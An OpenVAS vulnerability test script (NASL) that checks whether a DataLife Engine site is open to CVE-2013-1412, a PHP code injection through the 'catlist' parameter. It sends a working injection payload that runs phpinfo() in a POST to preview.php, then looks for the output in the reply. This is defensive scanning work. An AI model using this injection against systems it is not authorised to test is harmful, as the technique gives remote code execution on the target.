###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_datalife_57603.nasl 2939 2016-03-24 08:47:34Z benallard $
#
# DataLife Engine 'catlist' Parameter PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "DataLife Engine is prone to a remote PHP code-injection vulnerability.

An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.

DataLife Engine 9.7 is vulnerable; other versions may also be
affected.";


tag_solution = "Vendor updates are available. Please see the references for details.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103654";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(57603);
 script_cve_id("CVE-2013-1412");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 2939 $");

 script_name("DataLife Engine 'catlist' Parameter PHP Code Injection Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57603");

 script_tag(name:"last_modification", value:"$Date: 2016-03-24 09:47:34 +0100 (Thu, 24 Mar 2016) $");
 script_tag(name:"creation_date", value:"2013-02-02 12:26:45 +0100 (Sat, 02 Feb 2013)");
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

host = get_host_name();
ex = "catlist[0]=" + urlencode(str:"catlist[0]=OpenVAS')||phpinfo();//");
len = strlen(ex);

dirs = make_list("/datalife",cgi_dirs());

foreach dir (dirs) {

  req = string("POST ",dir,"/engine/preview.php HTTP/1.1\r\n",
              "Host: ", host,"\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ",len,"\r\n",
              "\r\n",
              ex);

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);   

  if("<title>phpinfo()" >< result) {
    security_message(port:port);
    exit(0);
  }

  
}

exit(0);

